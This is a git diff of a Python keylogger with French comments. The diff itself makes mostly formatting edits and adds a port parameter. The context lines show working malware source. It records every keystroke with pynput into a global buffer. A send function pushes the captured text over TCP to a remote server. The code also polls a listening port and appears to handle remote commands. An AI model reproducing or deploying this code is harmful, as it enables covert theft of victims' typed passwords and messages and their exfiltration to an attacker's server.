@@ -10,12 +10,10 @@ import os
 import re
 from pynput.keyboard import Key, Listener
 
-
 TXT_GLOB = ""
 
 
 def pav_num():
-
     touche = {
 
         "<96>": "0",
@@ -36,6 +34,7 @@ def pav_num():
 def kill_all():
     pid = os.getpid()
     os.kill(pid, 9)
+
 
 def parse(srt):
     pattern = r'<\d+>'
@@ -59,7 +58,7 @@ def kpr(key):
         TXT_GLOB += parse(str(key))
 
 
-def scan_socket():
+def scan_socket(port):
     try:
         rsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # TCP
 
@@ -90,7 +89,8 @@ def chrono():
     while True:
         seconds = 0
         while True:
-            try :
+            try:
+
                 print(f"Secondes : {seconds}")
                 seconds += 1
                 scan_socket(arg.listen)
@@ -106,26 +106,25 @@ def chrono():
             except:
                 kill_all()
 
+
 def keylogger():
     with Listener(on_press=kpr) as listener:
         listener.join()
 
 
 def send(data, port):
-
     try:
         client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
         if port:
             client_socket.connect((SRV, port))
-        else :
+        else:
             client_socket.connect((SRV, PORT))
 
         client_socket.send(data.encode('utf-8'))  # envoi
         client_socket.close()
     except:
         kill_all()
-
 
 
 def commands(cmd, port):
